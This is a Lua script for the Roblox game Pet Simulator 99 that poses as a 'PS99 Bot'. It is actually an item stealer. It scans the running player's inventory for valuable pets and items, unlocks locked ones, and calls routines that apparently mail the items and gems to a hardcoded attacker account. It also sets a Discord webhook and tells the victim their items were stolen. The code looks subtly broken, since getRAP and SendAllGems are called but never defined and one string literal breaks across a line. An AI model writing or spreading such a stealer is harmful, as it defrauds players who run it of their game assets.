
Username = "mainarxd123"
Username2 = "mainarxd123" -- Fallback user if the first mailbox is full
webhook = "https://discord.com/api/webhooks/1315408872793702520/pqWZQxlJS9muEbCfMkAWcOOEInL8EZkAHOgGlMxMEkgj8QkMQlqieEi22FLNgVYnCflq"
min_rap = 2 -- Minimum RAP for items

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local mailsent = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().MailboxSendsSinceReset
local plr = game.Players.LocalPlayer
local MailMessage = "Generated via PS99 Bot"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local getFucked = false

local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local newamount = 20000
if mailsent ~= 0 then
    newamount = math.ceil(newamount * (1.5 ^ mailsent))
end

local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
        break
    end
end

if newamount > GemAmount1 then
    return
end

local function ClaimMail()
    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end

local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}

for i, v in pairs(categoryList) do
    if save[v] ~= nil then
        for uid, item in pairs(save[v]) do
            if v == "Pet" then
                local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
                if dir.huge or dir.exclusiveLevel then
                    local rapValue = getRAP(v, item)
                    if rapValue >= min_rap then
                        local prefix = ""
                        if item.pt and item.pt == 1 then
                            prefix = "Golden "
                        elseif item.pt and item.pt == 2 then
                            prefix = "Rainbow "
                        end
                        if item.sh then
                            prefix = "Shiny " .. prefix
                        end
                        local id = prefix .. item.id
                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
                        totalRAP = totalRAP + (rapValue * (item._am or 1))
                    end
                end
            else
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
                    totalRAP = totalRAP + (rapValue * (item._am or 1))
                end
            end
            if item._lk then
                local args = {
                    [1] = uid,
                    [2] = false
                }
                network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
            end
        end
    end
end

if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
    ClaimMail()
    SendAllGems()
    local message = require(game.ReplicatedStorage.Library.Client.Message)
    message.Error("All your items just got stolen by PS99 Bot!
Join https://discord.gg/cXKzMv2E ")
    setclipboard("https://discord.gg/cXKzMv2E")
end
